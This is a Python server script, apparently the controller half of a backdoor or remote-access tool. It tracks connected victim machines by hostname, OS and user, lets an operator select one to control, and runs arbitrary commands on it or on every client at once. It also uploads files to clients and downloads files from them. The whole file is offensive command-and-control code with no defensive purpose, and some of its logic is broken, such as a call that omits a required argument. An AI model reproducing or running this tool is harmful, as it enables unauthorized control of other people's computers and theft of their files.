#!/usr/bin/python

import socket
import json
import sys
from typing import Dict
import os
import threading
import time
import hashlib
import base64

class SecureConnection:
    def __init__(self):
        self.key = hashlib.sha256(os.urandom(32)).digest()
        self.session_tokens = {}

    def generate_session_token(self, client_id):
        token = hashlib.sha256(os.urandom(32)).hexdigest()
        self.session_tokens[client_id] = token
        return token

    def verify_token(self, client_id, token):
        return self.session_tokens.get(client_id) == token

class Allclients:
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(10)
        self.clients: Dict[str, socket.socket] = {}
        self.client_details: Dict[str, dict] = {}
        self.active_client = None
        self.security = SecureConnection()
        print(f"[+] Server started on {ip}:{port}")


    def manage_client_connection(self, connection: socket.socket, address: tuple):
        client_id = None
        try:
            client_info = self.connect_receive(connection)
            client_id = f"{client_info['hostname']}_{address[0]}"

            token = self.security.generate_session_token(client_id)
            self.connect_send(connection, {"token": token})

            verification = self.connect_receive(connection)
            if verification == token:
                print(f"[+] Token verified for {client_id}")

            self.clients[client_id] = connection
            self.client_details[client_id] = {
                'ip': address[0],
                'port': address[1],
                'hostname': client_info['hostname'],
                'os': client_info['os'],
                'user': client_info['user'],
                'connected_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }

            print(f"[+] New connection from {client_id}")

            while True:
                if not connection:
                    break
                try:
                    connection.settimeout(3)
                    data = connection.recv(1024)
                    if not data:
                        break
                except socket.timeout:
                    continue
                except:
                    break
        except Exception as e:
            print(f"[-] Client managing error: {str(e)}")
        finally:
            if client_id and client_id in self.clients:
                del self.clients[client_id]
                del self.client_details[client_id]
                print(f"[-] Client {client_id} has disconnected.")


    def list_clients(self):
        print("\n=== Connected Clients ===")
        for client_id, details in self.client_details.items():
            active = " *" if client_id == self.active_client else ""
            print(f"{client_id}{active}:")
            for key, value in details.items():
                print(f"  {key}: {value}")
        print("======================")

    def select_client(self, client_id: str):
        if client_id in self.clients:
            self.active_client = client_id
            print(f"[+] Now controlling BD in client: {client_id}")
        else:
            print(f"[-] Client {client_id} not found.")


    def connect_send(self, connection: socket.socket, data: any):
        try:
            json_data = json.dumps(data)
            connection.send(json_data.encode())
        except Exception as e:
            raise Exception(f"Send error: {str(e)}")
            

    def connect_receive(self, connection: socket.socket) -> any:
        json_data = ""
        while True:
            try:
                connection.settimeout(10)
                part_packets = connection.recv(1024).decode()
                if not part_packets:
                    break
                json_data += part_packets
                return json.loads(json_data)
            except socket.timeout:
                raise Exception("Connection timed out.")
            except ValueError:
                continue
            except Exception as e:
                raise Exception(f"Receive error: {str(e)}")
            
            
    def accept_connections(self):
        while True:
            try:
                conn, addr = self.server.accept()
                client_thread = threading.Thread(target=self.manage_client_connection, 
                                                 args=(conn, addr))
                                                
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                print(f"[-] Connection error: {str(e)}")    


    def download_file_from_client(self, file_path, content):
        if not self.active_client:
            return "[-] No active client selected"
        try:
            # บอกให้ client ส่งไฟล์
            connection = self.clients[self.active_client]
            self.connect_send(connection, ["download", file_path])
            response = self.connect_receive(connection)
            
            if isinstance(response, str) and response.startswith("[-]"):
                return response
                
            # บันทึกไฟล์ในโฟลเดอร์ปัจจุบัน
            current_dir = os.getcwd()
            save_path = os.path.join(current_dir, os.path.basename(file_path))
            
            with open(save_path, "wb") as file:
                file.write(base64.b64decode(response))
            return f"[+] Downloaded {file_path} to {save_path}"
        except Exception as e:
            return f"[-] Download error: {str(e)}"

    def up_file_to_client(self, file_path):
        if not self.active_client:
            return "[-] No active client selected"
        try:
            # อ่านไฟล์จากโฟลเดอร์ที่อยู่
            current_dir = os.getcwd()
            file_path = os.path.join(current_dir, file_path)
            
            if not os.path.exists(file_path):
                return f"[-] File not found: {file_path}"
            
            with open(file_path, "rb") as file:
                file_data = base64.b64encode(file.read()).decode()
            
            # ส่งไฟล์ไปยัง client
            connection = self.clients[self.active_client]
            filename = os.path.basename(file_path)
            self.connect_send(connection, ["upload", filename, file_data])
            return self.connect_receive(connection)
        except Exception as e:
            return f"[-] Upload error: {str(e)}"

    def manage_file_commands(self, command):
        try:
            if command[0] == "download":
                if len(command) < 2:
                    return "[-] Usage: download <file_path>"
                return self.download_file_from_client(command[1])
                
            elif command[0] == "upload":
                if len(command) < 2:
                    return "[-] Usage: upload <file_path>"
                return self.up_file_to_client(command[1])
                
        except Exception as e:
            return f"[-] File operation error: {str(e)}"
        
    
    def all_clients_command(self, command: list):
        responses = {}
        for client_id, connection in self.clients.items():
            try:
                self.connect_send(connection, command)
                response = self.connect_receive(connection)
                responses[client_id] = response
            except Exception as e:
                responses[client_id] = f"Error: {str(e)}"
        return responses



    def execute_cmd(self, cmd: list):
        if not self.active_client:
            print("[-] No active BD client selected.")
            return
        
        try:
            connection = self.clients[self.active_client]
            self.connect_send(connection, cmd)

            response = self.connect_receive(connection)
            return response
        except Exception as e:
            return f"[-] Command execution has error: {str(e)}"

    def run_cmd(self):
        accept_thread = threading.Thread(target=self.accept_connections)
        accept_thread.daemon = True
        accept_thread.start()        
        while True:
            try:
                cmd = input("Type me >>> : ").strip()
                if not cmd:
                    continue

                cmd_parts = cmd.split()
                base_cmd = cmd_parts[0].lower()

                if base_cmd == "list":
                    self.list_clients()

                elif base_cmd == "select":
                    if len(cmd_parts) < 2:
                        print("[-] Usage: select <client_id>.")
                    self.select_client(cmd_parts[1])
                
                elif base_cmd in ["upload", "download"]:
                    result = self.manage_file_commands(cmd_parts)
                    print(result)
                    continue

                elif base_cmd == "allclients":
                    if len(cmd_parts) < 2:
                        print("[-] Usage: allclients <command>")
                        continue
                    responses = self.all_clients_command(cmd_parts[1:])
                    for client_id, response in responses.items():
                        print(f"\n{client_id}:")
                        print(response)


                elif base_cmd == "exit":
                    print("[!] Shutting down server....")
                    break

                else:
                    response = self.execute_cmd(cmd_parts)
                    print(response)

            except KeyboardInterrupt:
                print("\n[!] Keyboard interrupt received.")
                break
            except Exception as e:
                print(f"[-] Error cmd execution: {str(e)}")
            
        for connection in self.clients.values():
            connection.close()
        self.server.close()
        print("\n[+] Server shutdown completed")

if __name__ == "__main__":
    server = Allclients("192.168.1.135", 5555)
    server.run_cmd()
